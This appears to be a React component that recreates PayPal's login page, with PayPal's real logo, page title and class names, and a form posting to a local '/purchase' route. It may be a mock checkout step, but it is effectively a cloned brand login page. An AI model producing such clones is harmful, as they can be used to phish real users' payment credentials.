import React from "react";
import './style.css'
export default function PaypalPage() {



    return(
        <div id="main" className="main " role="main">
            <section id="login" className="login" data-role="page" data-title="Log in to your PayPal account">
                <div className="corral">
                    <div id="content" className="contentContainer">
                        <header>
                            <p className="paypal-logo paypal-logo-long">
                                <center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png" />
                                </center>
                            </p>
                        </header>
                        <form action="/purchase" className="proceed maskable"  autoComplete="off"
                              noValidate="">
                            <div id="passwordSection" className="clearfix">
                                <div className="textInput" id="login_emaildiv">
                                    <div className="fieldWrapper">
                                        <label htmlFor="email" className="fieldLabel">Email</label>
                                        <input id="email" type="email"
                                               className="hasHelp  validateEmpty " required="required"
                                               aria-required="true"  autoComplete="off" placeholder="Email" />
                                    </div>
                                </div>

                                <div className="textInput lastInputField" id="login_passworddiv">
                                    <div className="fieldWrapper"><label htmlFor="password"
                                                                         className="fieldLabel">Password</label>
                                        <input id="password"  type="password"
                                               className="hasHelp  validateEmpty " required="required"
                                               aria-required="true"  placeholder="Password" />
                                    </div>
                                </div>
                            </div>
                            <div className="actions actionsSpaced">
                                <button className="button actionContinue" type="submit" id="btnLogin"
                                        value="Login" >Log In
                                </button>
                            </div>
                            <div className="forgotLink"><a href="#" id="forgotPasswordModal"
                                                           className="scTrack:unifiedlogin-click-forgot-password">Having
                                trouble logging in?</a></div>
                            <input type="hidden" id="bp_mid" name="success" value="true"/>
                        </form>

                        </div>
                </div>
            </section>
        </div>
    )
}